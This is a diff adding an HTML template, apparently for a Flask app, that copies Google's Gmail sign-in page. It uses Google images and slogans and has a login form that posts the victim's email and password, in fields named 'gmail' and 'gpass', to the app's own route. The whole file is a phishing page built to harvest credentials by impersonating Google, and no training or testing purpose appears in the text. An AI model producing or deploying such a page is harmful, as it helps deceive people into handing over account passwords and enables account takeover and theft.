@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Gmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="{{ url_for('static', filename='gmail.css') }}" />
+</head>
+<body>
+    <center>
+    <img src="{{ url_for('static', filename='google.png') }}" width="135" height="50px">
+    <p style="font-size: 30px;">One Account. All of Google.</p>
+    <p>Sign in to Continue to Gmail</p>
+    <form class="login-box" action="gmail_login.html" method="POST">
+        <img src="{{ url_for('static', filename='avatar.png') }}" height="150px" width="150px">
+        <input class="input-gmail" type="email" name="gmail" placeholder="Email or Phone">
+        <br>
+        <input class="input-gmail" type="password" name="gpass" placeholder="Password">
+        <input class="gButton" type="submit" value="Login">
+    </form>
+    </center>
+</body>
+</html>
